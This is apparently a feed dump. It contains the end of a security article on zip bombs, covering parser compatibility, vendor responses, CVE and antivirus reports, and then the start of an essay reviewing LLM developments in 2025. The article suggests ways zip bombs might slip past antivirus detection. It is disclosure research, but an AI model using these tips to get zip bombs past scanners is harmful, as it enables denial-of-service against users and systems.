<td title="requires Zip64 Extended Information extra field when file size is 0xffffffff"><a href="https://github.com/thejoshwolfe/yauzl/issues/109">✖</a></td>
<td title="no Zip64 support"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L59">✓</a></td>
<td title="no Zip64 support"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive_common.h#95">✓</a></td>
<td title="checks for Zip64 Extended Information extra field if file size is 0xffffffff, but does not require it"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1275-L1277">✓</a></td>
</tr>

<tr>
<th>permits file count of 2<sup>16</sup>&nbsp;−&nbsp;1</th>
<td title="checks for Zip64 end of central directory locator independent of file count">✓</td>
<td title="checks for Zip64 end of central directory locator independent of file count"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L258-L259">✓</a></td>
<td title="looks for Zip64 end of central directory locator, but continues if not present"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L502-L511">✓</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/issues/108">✖</a></td>
<td title="no Zip64 support"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L79">✓</a></td>
<td title="no Zip64 support"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive_common.h#51">✓</a></td>
<td title="Zip64 end of central directory locator is optional"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1139">✓</a></td>
</tr>
</tbody>

<tbody>
<!--
<tr>
<th>unzips recursively (42.zip)</th>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
<td class=na title="is a library">N/A</td>
<td class=na title="is a library">N/A</td>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
<td class=n title=no>✖</td>
</tr>
-->

<tr>
<th>unzips <a href="#overlap">overlap.zip</a></th>
<td>warns</td>
<td title="no">✖</td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="no">✖</td>
<td title="no">✖</td>
</tr>

<tr>
<th>unzips <a href="#allocation">zbsm.zip and zblg.zip</a></th>
<td><abbr title="yes">✓</abbr></td>
<td><abbr title="yes">✓</abbr></td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="crashes because it tries to extract all into memory, but handles the construction">✓</td>
<td title="yes">✓</td>
<td title="no">✖</td>
</tr>

<tr>
<th>unzips <a href="#zip64">zbxl.zip</a></th>
<td><abbr title="yes">✓</abbr></td>
<td><abbr title="yes">✓</abbr></td>
<td title="yes">✓</td>
<td title="yes">✓</td>
<td title="no Zip64 support">✖</td>
<td title="no Zip64 support">✖</td>
<td title="no">✖</td>
</tr>
</tbody>

</table>

</section>

<section id="credits">
<h2>Credits</h2>

<p>
I&nbsp;thank
<a href="https://madler.net/madler/">Mark Adler</a>,
<a href="https://bburky.com/">Blake Burkhart</a>,
<a href="https://gynvael.coldwind.pl/">Gynvael Coldwind</a>,
<a href="https://swtch.com/~rsc/">Russ Cox</a>,
<a href="https://www.brandonenright.net/">Brandon Enright</a>,
<a href="https://github.com/jorangreef">Joran Dirk Greef</a>,
<a href="https://idea.popcount.org/">Marek Majkowski</a>,
<a href="https://wolfesoftware.com/">Josh Wolfe</a>,
and the <a href="https://www.usenix.org/conference/woot19/">USENIX WOOT 2019</a> reviewers
for comments on this article or a draft.
Caolán McNamara evaluated the security impact
of the zip bombs in LibreOffice.
<a href="https://habr.com/users/m1rko/">@m1rko</a>
wrote a <a href="https://habr.com/ru/post/459254/">Russian translation</a>.
<a href="https://zerosun.top/">北岸冷若冰霜</a>
wrote a <a href="https://zerosun.top/2019/07/07/A-better-zip-bomb/">Chinese translation</a>.
Daniel Ketterer reported that the <code>--template</code> option
was broken after the addition of <a href="#giant-steps"><code>--giant-steps</code></a>.
</p>

<p>
A&nbsp;version of this article
appeared at the
<a href="https://www.usenix.org/conference/woot19/presentation/fifield">USENIX WOOT 2019</a>
workshop.
The workshop talk
<a href="https://www.bamsoftware.com/talks/woot19-zipbomb/">video, slides, and transcript</a>
are available.
The <a href="#source">source code</a> of the paper is available.
The <a href="https://www.usenix.org/conference/woot19/call-for-artifacts">artifacts</a>
prepared for submission are <a href="https://www.bamsoftware.com/hacks/zipbomb/zipbomb-woot19.zip">zipbomb-woot19.zip</a>.
</p>

<p>
Did you find a system that chokes on one of these zip bombs?
Did they help you demonstrate a vulnerability or
win a bug bounty?
<a href="#contact">Let me know</a> and I'll try to mention it here.
</p>

<dl>
<dt id="libreoffice">LibreOffice 6.1.5.2</dt>
<dd>
<p>
zblg.zip renamed to zblg.odt or zblg.docx
will cause LibreOffice to
create and delete a number of ~4&nbsp;GB temporary files
as it attempts to determine the file format.
It does eventually finish, and it deletes
the temporary files as it goes,
so it's only a temporary DoS that doesn't fill up the disk.
Caolán McNamara replied to my bug report.
</p>
</dd>
<dt id="addons-server">Mozilla addons-server 2019.06.06</dt>
<dd>
<p>
I tried the zip bombs against a local installation of addons-server,
which is part of the software behind addons.mozilla.org.
The system handles it gracefully,
imposing a <a href="https://github.com/mozilla/addons-server/blob/2019.06.06/src/olympia/lib/settings_base.py#L1457-L1458">time limit</a>
of <time datetime="110s">110&nbsp;s</time> on extraction.
The zip bomb expands as fast as the disk will let it up to the time limit,
but after that point the process is killed and the unzipped files
are eventually automatically cleaned up.
</p>
</dd>
<dt id="unzip">UnZip 6.0</dt>
<dd>
<p>
Mark Adler wrote
<a href="https://github.com/madler/unzip/commits/6519bf0f8a896851d9708da11e1b63c818238c8f">a patch</a>
for UnZip to detect this class of zip bomb.
</p>
<p>
<time>2019-07-05</time>:
I noticed that <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13232">CVE-2019-13232</a>
was assigned for UnZip.
Personally, I would dispute that UnZip's (or any zip parser's)
ability to process a zip bomb of the kind discussed here
necessarily represents a security vulnerability, or even a bug.
It's a natural implementation and does not violate the specification
in any way that I can tell.
The type discussed in this article is only one type of zip bomb,
and there are many ways in which zip parsing can go wrong that are not bombs.
If you want to defend against resource exhaustion attacks,
you should <em>not</em> try to enumerate, detect, and block
every individual known attack;
rather you should impose external limits on time and other resources
so that the parser cannot misbehave too much,
no matter what kind of attack it faces.
There is nothing wrong with attempting to detect and reject certain
constructions as a first-pass optimization,
but you can't stop there.
If you do not eventually isolate and limit
operations on untrusted data, your system is likely still vulnerable.
Consider an analogy with <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">cross-site scripting</a> in HTML:
the right defense is not to try and filter out bytes that may be interpreted as code,
it's to escape everything properly.
</p>
<p>
Mark Adler's patch made its way into Debian in
<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=931433">bug&nbsp;#931433</a>.
<!-- Debian 8 "Jessie" https://lists.debian.org/debian-lts-announce/2019/07/msg00005.html -->
There were some unanticipated consequences:
problems parsing certain Java JARs
(<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=931895">bug #931895</a>)
and problems with the mutant zip format of Firefox's omni.ja file
(<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=932404">bug #932404</a>).
SUSE decided
<a href="https://bugzilla.suse.com/show_bug.cgi?id=1140748#c2">not to do anything</a>
about CVE-2019-13232.
I think both Debian's and SUSE's choices are defensible.
</p>
<!-- https://bugzilla.redhat.com/show_bug.cgi?id=1727761 -->
<!-- https://bugs.gentoo.org/691566 -->
</dd>
<dt id="ronomon">ronomon/zip</dt>
<dd>
<p>
Shortly after the publication of this article,
Joran Dirk Greef published a
<a href="https://github.com/ronomon/zip">restrictive zip parser</a> (JavaScript)
that prohibits irregularities such as overlapping files
or unused space between files.
While it may thereby reject certain valid zip files,
the idea is to ensure that any downstream parsers
will receive only clean, easy-to-parse files.
</p>
</dd>
<dt id="antivirus">antivirus engines</dt>
<dd>
<p>
Overall, it seems that malware scanners have slowly begun
to recognize zip bombs of this kind
(or at least the specific samples available for download)
as malicious.
It would be interesting to see whether the detection is robust or brittle.
You could reverse the order of the entries in the central directory, for example,
and see whether the zip files are still detected.
In the <a href="#source">source code</a>,
there's a recipe for generating zbsm.extra.zip,
which is like zbsm.zip except that it uses
<a href="#extra">extra-field quoting</a> instead of
<a href="#quote">DEFLATE quoting</a>—if you are a customer
of an AV service that detects zbsm.zip but not zbsm.extra.zip,
you should ask for an explanation.
Another simple variant is
<a href="https://www.bamsoftware.com/hacks/zipbomb/spacer.txt">inserting spacer files between the bomb files</a>,
which may fool certain overlap-detection algorithms.
</p>
<p>
Twitter user @TVqQAAMAAAAEAAA
<a href="https://twitter.com/TVqQAAMAAAAEAAA/status/1146351962486476801">reports</a>
<!-- https://web.archive.org/web/20190703141828/https:/twitter.com/TVqQAAMAAAAEAAA/status/1146351962486476801 -->
"McAfee AV on my test machine just exploded."
I haven't independently confirmed it, nor do I have details such as a version number.
</p>
<p>
Tavis Ormandy <a href="https://twitter.com/taviso/status/1146477576132542466">points out</a>
<!-- https://web.archive.org/web/20190707044306/https://twitter.com/taviso/status/1146477576132542466 -->
that there are a number of "Timeout" results in
<a href="https://www.virustotal.com/gui/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a/detection">the VirusTotal for zblg.zip</a>
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zblg-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>.
<!-- Nor wayback machine nor archive.is worked on the virustotal site :(
https://web.archive.org/web/20190705165359/https://www.virustotal.com/gui/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a/detection
https://web.archive.org/web/20190705170818/https://www.virustotal.com/gui/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99/detection
https://web.archive.org/web/20190705170924/https://www.virustotal.com/gui/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744/detection
-->
<!-- but the old-browsers mode kinda works
https://www.virustotal.com/old-browsers/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99
http://archivecaslytosk.onion/sgvC9

https://www.virustotal.com/old-browsers/file/f1dc920869794df3e258f42f9b99157104cd3f8c14394c1b9d043d6fcda14c0a
http://archivecaslytosk.onion/ywtHj

https://www.virustotal.com/old-browsers/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744
http://archivecaslytosk.onion/Xz7q3
-->
AhnLab-V3, ClamAV, DrWeb, Endgame, F-Secure, GData, K7AntiVirus, K7GW, MaxSecure, McAfee, McAfee-GW-Edition, Panda, Qihoo-360, Sophos ML, VBA32.
<a href="https://www.virustotal.com/gui/file/fb4ff972d21189beec11e05109c4354d0cd6d3b629263d6c950cf8cc3f78bd99/detection">The results for zbsm.zip</a>
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zbsm-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>
are similar, though with a different set of timed-out engines:
Baido, Bkav, ClamAV, CMC, DrWeb, Endgame, ESET-NOD32, F-Secure, GData, Kingsoft, McAfee-GW-Edition, NANO-Antivirus, Acronis.
Interestingly, there are no timeouts in
<a href="https://www.virustotal.com/gui/file/eafd8f574ea7fd0f345eaa19eae8d0d78d5323c8154592c850a2d78a86817744/detection">the results for zbxl.zip</a>;
<small><a href="https://www.bamsoftware.com/hacks/zipbomb/vt-zbxl-20190706.png">(screenshot <time>2019-07-06</time>)</a></small>
perhaps this means that some antivirus doesn't support Zip64?
</p>
<p>
Forum user 100 <a href="https://forum.eset.com/topic/20123-zip-bombs-with-zip64-not-detected/">reported</a>
that a certain ESET product did not detect zbxl.zip, possibly because it uses Zip64.
An update in the thread three days later showed the product being updated to detect it.
</p>
<p>
In <a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356">ClamAV bug 12356</a>,
Hanno Böck reported that zblg.zip caused high CPU usage
in clamscan.
<a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356#c5">An initial patch</a>
to detect overlapping files
<a href="https://seclists.org/oss-sec/2019/q3/121">turned out to be incomplete</a>
because it only checked adjacent pairs of files.
(I personally mishandled this issue
by posting details of a workaround on the bug tracker,
instead of reporting it privately.)
<a href="https://bugzilla.clamav.net/show_bug.cgi?id=12356#c14">A later patch</a>
imposed a time limit on file analysis.
</p>
<p id="flytech">
<time>2020-07-28</time>: FlyTech Videos presented a
<a href="https://www.youtube.com/watch?v=peeYOqejWfg">video testing various zip bombs</a>,
including <a href="#zbxl">zbxl.zip</a>,
against Windows Defender, Windows Explorer, and 7-zip.
</p>
<p>
In my web server logs, I noticed a number of referers that
appear to point to bug trackers.
</p>
<ul>
<li>http://jira.athr.ru/browse/WEB-12882</li>
<li>https://project.avira.org/browse/ENGINE-2307</li>
<li>https://project.avira.org/browse/ENGINE-2363</li>
<li>https://topdesk-imp.cicapp.nl/tas/secure/mango/window/4</li>
<li>https://jira-eng-rtp3.cisco.com/jira/browse/AMP4E-4849</li>
<li>https://jira-eng-sjc1.cisco.com/jira/browse/CLAM-965</li>
<li>https://flightdataservices.atlassian.net/secure/RapidBoard.jspa?selectedIssue=FDS-136</li>
<li>https://projects.ucd.gpn.gov.uk/browse/VULN-1483</li>
<li>https://testrail-int.qa1.immunet.com/index.php?/cases/view/923720</li>
<li>http://redmine-int-prod.intranet.cnim.net/issues/5596</li>
<li>https://bugs.drweb.com/view.php?id=159759</li>
<li>https://dev-jira.dynatrace.org/browse/APM-188227</li>
<li>https://webgate.ec.europa.eu/CITnet/jira/browse/EPREL-2150</li>
<li>https://jira.egnyte-it.com/browse/IN-8480</li>
<li>https://jira.hq.eset.com/browse/CCDBL-1492</li>
<li>https://bugzilla.olympus.f5net.com/show_bug.cgi?id=819053</li>
<li>https://mantis.fortinet.com/bug_view_page.php?bug_id=0570222</li>
<li>https://redmine.joesecurity.org:64998/issues/4705</li>
<li>http://dev.maildev.jp/mantis/view.php?id=5839</li>
<li>https://confluence.managed.lu/pages/viewpage.action?pageId=47974242</li>
<li>https://jira-lvs.prod.mcafee.com/browse/TSWS-653</li>
<li>https://jira.modulbank.ru/browse/PV-33012</li>
<li>http://jira.netzwerk.intern:8080/browse/SALES-81</li>
<li>https://jira-hq.paloaltonetworks.local/browse/CON-43391</li>
<li>https://jira-hq.paloaltonetworks.local/browse/GSRT-11680</li>
<li>https://jira-hq.paloaltonetworks.local/browse/PAN-124201</li>
<li>https://paynearme.atlassian.net/browse/PNM-4494</li>
<li>https://jira.proofpoint.com/jira/browse/PE-29410</li>
<li>https://dev.pulsesecure.net/jira/browse/PRS-379163</li>
<li>https://qualtrics.atlassian.net/browse/APP-326</li>
<li>https://jira.sastdev.net/browse/CIS-2819</li>
<li>https://jira.sastdev.net/secure/RapidBoard.jspa?selectedIssue=EC-709</li>
<li>https://bugzilla.seeburger.de/show_bug.cgi?id=89294</li>
<li>https://svm.cert.siemens.com/auseno/create_edit_vulnerability.php?vulnid=48573</li>
<li>https://jira.sophos.net/browse/CPISSUE-6560</li>
<li>https://jira.vrt.sourcefire.com/browse/TT-1070</li>
<li>https://task.jarvis.trendmicro.com/browse/JPSE-10432</li>
<li>https://segjira.trendmicro.com:8443/browse/SEG-55636</li>
<li>https://segjira.trendmicro.com:8443/browse/SEG-58824</li>
<li>https://ucsc-cgl.atlassian.net/secure/RapidBoard.jspa?selectedIssue=SEAB-327</li>
<li>https://jira.withbc.com/browse/BC-43950</li>
<li>https://zscaler.zendesk.com/agent/tickets/849971</li>
</ul>
</dd>
<dt id="browsers">web browsers</dt>
<dd>
<p>
I didn't directly experience this myself,
but reports online say that Chrome and Safari may automatically unzip
files after downloading.
</p>
<ul>
<li><p><a href="https://habr.com/ru/post/459254/#comment_20369364">ittakir</a>: "Скачал самый маленький файл на 5GB, Chrome тут же начал его распаковывать, хотя его об этом не просили, ну и кушать процессор и диск." <i>"I downloaded the smallest file on 5GB, Chrome immediately began to unpack it, although it was not asked for it, well, to eat the processor and disk."</i></p></li>
<li><p><a href="https://old.reddit.com/r/programming/comments/c8ylxn/zblg_nonrecursive_zip_bomb_with_a_280000001_ratio/esrsxvi/">Rzah</a>: "Yet another reason why 'Open Safe files after downloading' is a stupid default setting for a web browser."</p></li>
</ul>
<p>
Chromium commit <a href="https://chromium.googlesource.com/chromium/src/+/f04d9b15bd1cba1433ad5453bc3ebff933d0e3bb">f04d9b15bd1cba1433ad5453bc3ebff933d0e3bb</a> is perhaps related:
</p>
<blockquote>
<p>
Add metrics detecting anomalously high ZIP compression ratios
</p>
<p>
It's possible for a single ZIP entry to be very large, even if we only
scan small ZIP archives. These metrics will measure how often that occurs.
</p>
</blockquote>
</dd>
<dt id="filesystems">filesystems</dt>
<dd>
<p>
Something I didn't anticipate:
unzipping one of the bombs on a compressed filesystem can be relatively safe.
</p>
<ul>
<li><p><a href="https://old.reddit.com/r/programming/comments/cbvqzu/the_most_clever_zip_bomb_ever_made_explodes_a/etkazxk/">flying_gel</a>:
"If I unzip this onto a compressed zfs dataset, will the resulting file be small? Edit: Just did a small test with a 42KB-&gt;5.5GB zip bomb. I ended up with 165MB worth of files so while just 3% of the full bomb, it's still a 4028 times inflation. ... I only have the standard LZ4 compression enabled, no dedup."</p></li>
</ul>
</dd>
<dt id="twitter">Twitter</dt>
<dd>
<p>
Links to this article had been widely shared on Twitter
since around <time>2019-07-02</time>,
but around <time>2019-07-20</time> it began showing
<a href="https://twitter.com/safety/unsafe_link_warning?unsafe_link=https://www.bamsoftware.com/hacks/zipbomb/">an "unsafe link" interstitial</a>
<small>(<a href="https://www.bamsoftware.com/hacks/zipbomb/twitter-unsafe.png">screenshot</a>, <a href="https://web.archive.org/web/20190721031831/https://twitter.com/safety/unsafe_link_warning?unsafe_link=https://www.bamsoftware.com/hacks/zipbomb/">archive</a>)</small>.
</p>
</dd>
<dt id="safebrowsing">Safe Browsing</dt>
<dd>
<p>
Sometime around <time>2019-07-23</time> it seems that this page,
and <em>every</em> page on a *.bamsoftware.com domain,
got added to the <a href="https://safebrowsing.google.com/">Safe Browsing</a>
service used by web browsers
to block malware and phishing sites.
<a href="https://transparencyreport.google.com/safe-browsing/search?url=bamsoftware.com">Site status check</a>,
<a href="https://www.bamsoftware.com/hacks/zipbomb/safebrowsing-www.bamsoftware.com-20190724.png">block page screenshot</a>.
From a few quick checks, it looks like pages on bamsoftware.com
have been demoted or delisted on the google.com search engine as well.
</p>
<p>
The Safe Browsing block is a bit annoying,
because it disrupted <a href="https://snowflake.torproject.org/">Snowflake</a>,
a completely unrelated service that happened to use the domain
snowflake-broker.bamsoftware.com, which did not even host any files
but was strictly a web API server.
See <a href="https://bugs.torproject.org/31230">#31230 Firefox addon blocked from agent by Google Safe Browsing service</a>.
</p>
<p>
The Safe Browsing block seemed to end
on or before
<a href="https://www.bamsoftware.com/hacks/zipbomb/transparencyreport.google-www.bamsoftware.com-20190816.png"><time>2019-08-16</time></a>.
</p>
</dd>
<dt id="xfinity">Xfinity xFi Protected Browsing</dt>
<dd>
<p>
On <time>2019-11-26</time>, I was informed
by Hooman Mohajeri Moghaddam
that the Comcast Xfinity xFi
<a href="https://www.vice.com/en_us/article/evm3qk/comcast-blocking-paypal-customers-say-forum-net-neutrality">"Protected Browsing"</a>
feature blocks the bamsoftware.com domain, including this page
(<a href="https://www.bamsoftware.com/hacks/zipbomb/xfinity-blockpage.png">screenshot</a>).
</p>
</dd>
<dt id="dlang">D std.zip</dt>
<dd>
<p>
The D programming language
<a href="https://issues.dlang.org/show_bug.cgi?id=20027">made a modification</a>
to the <a href="https://dlang.org/library/std/zip.html">std.zip module</a>
to detect overlapping files.
</p>
</dd>
<!-- https://issues.dlang.org/show_bug.cgi?id=20027 -->
<!-- https://github.com/golang/go/issues/33026 https://github.com/golang/go/issues/33036 -->

<dt id="ios">Apple iOS and iPadOS</dt>
<dd>
<p>
Dzmitry Plotnikau sent me a report saying that
a zip bomb could use up all cache storage
on iPhones running iOS 12 and 13, even if only opened using "Quick look."
The exhaustion of storage could have various side effects,
including misbehaving apps, deletion of local cloud files, and OS crashes,
in some cases requiring a factory reset to remedy.
The bug was mitigated in iOS 14.0
(and likely other, contemporaneous point release of iOS and iPadOS).
See <a href="https://support.apple.com/en-us/HT211850">HT211850</a>
under the "libarchive" heading.
</p>
</dd>
</dl>

</section>

<section id="plea">
<h2>A final plea</h2>

<p>
It's time to put an end to Facebook.
Working there is not ethically neutral:
every day that you go into work, you are doing something wrong.
If you have a Facebook account, delete it.
If you work at Facebook, quit.
</p>

<p>
And let us not forget that the National Security Agency
must be destroyed.
</p>

</section>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LLM Year in Review (311 pts)]]></title>
            <link>https://karpathy.bearblog.dev/year-in-review-2025/</link>
            <guid>46330726</guid>
            <pubDate>Fri, 19 Dec 2025 20:49:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://karpathy.bearblog.dev/year-in-review-2025/">https://karpathy.bearblog.dev/year-in-review-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=46330726">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    

    

    
        

        <p>
            <i>
                <time datetime="2025-12-19T18:00Z">
    19 Dec, 2025
</time>
            </i>
        </p>
    

    <p><img src="https://bear-images.sfo2.cdn.digitaloceanspaces.com/karpathy/unnamed.webp" alt="unnamed"></p>
<p>2025 has been a strong and eventful year of progress in LLMs. The following is a list of personally notable and mildly surprising "paradigm changes" - things that altered the landscape and stood out to me conceptually.</p>
<h3 id="1-reinforcement-learning-from-verifiable-rewards-rlvr">1. Reinforcement Learning from Verifiable Rewards (RLVR)</h3><p>At the start of 2025, the LLM production stack in all labs looked something like this:</p>
<ol>
<li>Pretraining (GPT-2/3 of ~2020)</li>
<li>Supervised Finetuning (InstructGPT ~2022) and</li>
<li>Reinforcement Learning from Human Feedback (RLHF ~2022)</li>
</ol>
<p>This was the stable and proven recipe for training a production-grade LLM for a while. In 2025, Reinforcement Learning from Verifiable Rewards (RLVR) emerged as the de facto new major stage to add to this mix. By training LLMs against automatically verifiable rewards across a number of environments (e.g. think math/code puzzles), the LLMs spontaneously develop strategies that look like "reasoning" to humans - they learn to break down problem solving into intermediate calculations and they learn a number of problem solving strategies for going back and forth to figure things out (see DeepSeek R1 paper for examples). These strategies would have been very difficult to achieve in the previous paradigms because it's not clear what the optimal reasoning traces and recoveries look like for the LLM - it has to find what works for it, via the optimization against rewards.</p>
<p>Unlike the SFT and RLHF stage, which are both relatively thin/short stages (minor finetunes computationally), RLVR involves training against objective (non-gameable) reward functions which allows for a lot longer optimization. Running RLVR turned out to offer high capability/$, which gobbled up the compute that was originally intended for pretraining. Therefore, most of the capability progress of 2025 was defined by the LLM labs chewing through the overhang of this new stage and overall we saw ~similar sized LLMs but a lot longer RL runs. Also unique to this new stage, we got a whole new knob (and and associated scaling law) to control capability as a function of test time compute by generating longer reasoning traces and increasing "thinking time". OpenAI o1 (late 2024) was the very first demonstration of an RLVR model, but the o3 release (early 2025) was the obvious point of inflection where you could intuitively feel the difference.</p>
<h3 id="2-ghosts-vs-animals-jagged-intelligence">2. Ghosts vs. Animals / Jagged Intelligence</h3><p>2025 is where I (and I think the rest of the industry also) first started to internalize the "shape" of LLM intelligence in a more intuitive sense. We're not "evolving/growing animals", we are "summoning ghosts". Everything about the LLM stack is different (neural architecture, training data, training algorithms, and especially optimization pressure) so it should be no surprise that we are getting very different entities in the intelligence space, which are inappropriate to think about through an animal lens. Supervision bits-wise, human neural nets are optimized for survival of a tribe in the jungle but LLM neural nets are optimized for imitating humanity's text, collecting rewards in math puzzles, and getting that upvote from a human on the LM Arena. As verifiable domains allow for RLVR, LLMs "spike" in capability in the vicinity of these domains and overall display amusingly jagged performance characteristics - they are at the same time a genius polymath and a confused and cognitively challenged grade schooler, seconds away from getting tricked by a jailbreak to exfiltrate your data.</p>
<p><img src="https://bear-images.sfo2.cdn.digitaloceanspaces.com/karpathy/g6zymj4a0amnjkj.webp" alt="G6zymj4a0AMNJkJ">(human intelligence: blue, AI intelligence: red. I like this version of the meme (I'm sorry I lost the reference to its original post on X) for pointing out that human intelligence is also jagged in its own different way.)</p>
<p>Related to all this is my general apathy and loss of trust in benchmarks in 2025. The core issue is that benchmarks are almost by construction verifiable environments and are therefore immediately susceptible to RLVR and weaker forms of it via synthetic data generation. In the typical benchmaxxing process, teams in LLM labs inevitably construct environments adjacent to little pockets of the embedding space occupied by benchmarks and grow jaggies to cover them. Training on the test set is a new art form.</p>
<p>What does it look like to crush all the benchmarks but still not get AGI?</p>
<p>I have written a lot more on the topic of this section here:</p>
<ul>
<li><a href="https://karpathy.bearblog.dev/animals-vs-ghosts/">Animals vs. Ghosts</a></li>
<li><a href="https://karpathy.bearblog.dev/verifiability/">Verifiability</a></li>
<li><a href="https://karpathy.bearblog.dev/the-space-of-minds">The Space of Minds</a></li>
</ul>
<h3 id="3-cursor-new-layer-of-llm-apps">3. Cursor / new layer of LLM apps</h3><p>What I find most notable about Cursor (other than its meteoric rise this year) is that it convincingly revealed a new layer of an "LLM app" - people started to talk about "Cursor for X". As I highlighted in my Y Combinator talk this year (<a href="https://www.donnamagi.com/articles/karpathy-yc-talk">transcript</a> and <a href="https://www.youtube.com/watch?v=LCEmiRjPEtQ">video</a>), LLM apps like Cursor bundle and orchestrate LLM calls for specific verticals:</p>
<ol>
<li>They do the "context engineering"</li>
<li>They orchestrate multiple LLM calls under the hood strung into increasingly more complex DAGs, carefully balancing performance and cost tradeoffs.</li>
<li>They provide an application-specific GUI for the human in the loop</li>
<li>They offer an "autonomy slider"</li>
</ol>
<p>A lot of chatter has been spent in 2025 on how "thick" this new app layer is. Will the LLM labs capture all applications or are there green pastures for LLM apps? Personally I suspect that LLM labs will trend to graduate the generally capable college student, but LLM apps will organize, finetune and actually animate teams of them into deployed professionals in specific verticals by supplying private data, sensors and actuators and feedback loops.</p>
<h3 id="4-claude-code-ai-that-lives-on-your-computer">4. Claude Code / AI that lives on your computer</h3><p>Claude Code (CC) emerged as the first convincing demonstration of what an LLM Agent looks like - something that in a loopy way strings together tool use and reasoning for extended problem solving. In addition, CC is notable to me in that it runs on your computer and with your private environment, data and context. I think OpenAI got this wrong because they focused their early codex / agent efforts on cloud deployments in containers orchestrated from ChatGPT instead of simply <code>localhost</code>. And while agent swarms running in the cloud feels like the "AGI endgame", we live in an intermediate and slow enough takeoff world of jagged capabilities that it makes more sense to run the agents directly on the developer's computer. Note that the primary distinction that matters is not about where the "AI ops" happen to run (in the cloud, locally or whatever), but about everything else - the already-existing and booted up computer, its installation, context, data, secrets, configuration, and the low-latency interaction. Anthropic got this order of precedence correct and packaged CC into a delightful, minimal CLI form factor that changed what AI looks like - it's not just a website you go to like Google, it's a little spirit/ghost that "lives" on your computer. This is a new, distinct paradigm of interaction with an AI.</p>
<h3 id="5-vibe-coding">5. Vibe coding</h3><p>2025 is the year that AI crossed a capability threshold necessary to build all kinds of impressive programs simply via English, forgetting that the code even exists. Amusingly, I coined the term "vibe coding" in <a href="https://x.com/karpathy/status/1886192184808149383">this shower of thoughts tweet</a> totally oblivious to how far it would go :). With vibe coding, programming is not strictly reserved for highly trained professionals, it is something anyone can do. In this capacity, it is yet another example of what I wrote about in <a href="https://karpathy.bearblog.dev/power-to-the-people/">Power to the people: How LLMs flip the script on technology diffusion</a>, on how (in sharp contrast to all other technology so far) regular people benefit a lot more from LLMs compared to professionals, corporations and governments. But not only does vibe coding empower regular people to approach programming, it empowers trained professionals to write a lot more (vibe coded) software that would otherwise never be written. In nanochat, I vibe coded my own custom highly efficient BPE tokenizer in Rust instead of having to adopt existing libraries or learn Rust at that level. I vibe coded many projects this year as quick app demos of something I wanted to exist (e.g. see <a href="https://karpathy.bearblog.dev/vibe-coding-menugen">menugen</a>, <a href="https://github.com/karpathy/llm-council">llm-council</a>, <a href="https://github.com/karpathy/reader3">reader3</a>, <a href="https://github.com/karpathy/hn-time-capsule">HN time capsule</a>). And I've vibe coded entire ephemeral apps just to find a single bug because why not - code is suddenly free, ephemeral, malleable, discardable after single use. Vibe coding will terraform software and alter job descriptions.</p>
<h3 id="6-nano-banana-llm-gui">6. Nano banana / LLM GUI</h3><p>Google Gemini Nano banana is one of the most incredible, paradigm-shifting models of 2025. In my world view, LLMs are the next major computing paradigm similar to computers of the 1970s, 80s, etc. Therefore, we are going to see similar kinds of innovations for fundamentally similar kinds of reasons. We're going to see equivalents of personal computing, of microcontrollers (cognitive core), or internet (of agents), etc etc. In particular, in terms of the UIUX, "chatting" with LLMs is a bit like issuing commands to a computer console in the 1980s. Text is the raw/favored data representation for computers (and LLMs), but it is not the favored format for people, especially at the input. People actually dislike reading text - it is slow and effortful. Instead, people love to consume information visually and spatially and this is why the GUI has been invented in traditional computing. In the same way, LLMs should speak to us in our favored format - in images, infographics, slides, whiteboards, animations/videos, web apps, etc. The early and present version of this of course are things like emoji and Markdown, which are ways to "dress up" and lay out text visually for easier consumption with titles, bold, italics, lists, tables, etc. But who is actually going to build the LLM GUI? In this world view, nano banana is a first early hint of what that might look like. And importantly, one notable aspect of it is that it's not just about the image generation itself, it's about the joint capability coming from text generation, image generation and world knowledge, all tangled up in the model weights.</p>
<hr>
